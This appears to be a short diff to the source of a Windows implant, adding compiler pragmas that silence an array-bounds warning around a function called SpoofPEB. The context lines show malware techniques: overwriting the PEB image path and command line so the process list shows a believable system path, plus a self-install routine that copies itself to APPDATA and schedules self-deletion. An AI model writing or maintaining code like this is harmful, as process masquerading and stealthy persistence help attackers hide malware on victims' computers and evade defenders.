@@ -156,6 +156,12 @@ DWORD WINAPI ImplantThread(LPVOID) {
 // Overwrites PEB.ProcessParameters.ImagePathName and CommandLine with a
 // believable system path. Task Manager and most tools read from the PEB —
 // not from the filesystem — so this changes what shows in the process list.
+
+// GCC 13 + MinGW intrinsics: __readgsqword(0x60) is modeled as a subscript
+// into a zero-sized array at address zero, tripping -Warray-bounds on every
+// build. Known false positive — the emitted segment-relative read is correct.
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Warray-bounds"
 static void SpoofPEB() {
     typedef struct _PEB_LDR_HACK {
         BYTE Reserved1[16];
@@ -208,6 +214,7 @@ static void SpoofPEB() {
         VirtualProtect(cmd.Buffer, cmd.MaximumLength, old2, &old2);
     }
 }
+#pragma GCC diagnostic pop
 
 // ─── Self-install: copy to APPDATA, launch from there, schedule self-deletion ─
 // Returns true  → continue running (we ARE the installed copy).
